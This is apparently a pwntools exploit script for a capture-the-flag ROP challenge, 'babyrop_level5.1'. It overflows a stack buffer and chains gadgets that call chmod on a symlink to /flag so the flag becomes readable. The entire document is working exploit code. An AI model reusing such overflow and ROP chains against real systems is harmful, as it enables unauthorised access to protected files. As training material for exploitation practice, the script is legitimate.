# ln -s /flag '!'

from pwn import *

p = process("/challenge/babyrop_level5.1")

payload = b""
payload += b"A" * 120 # Buffer
payload += b"B" * 8 # Saved RBP
payload += b"C" * 8
# pop rax ; ret
payload += p64(0x40214a)
payload += p64(0x5a)
# pop rdi ; ret
payload += p64(0x402159)
payload += p64(0x403030) # -> "!"
# pop rsi ; ret
payload += p64(0x402139)
payload += p64(0x4)
# syscall
payload += p64(0x402141)

p.sendline(payload)

print(p.recvall())

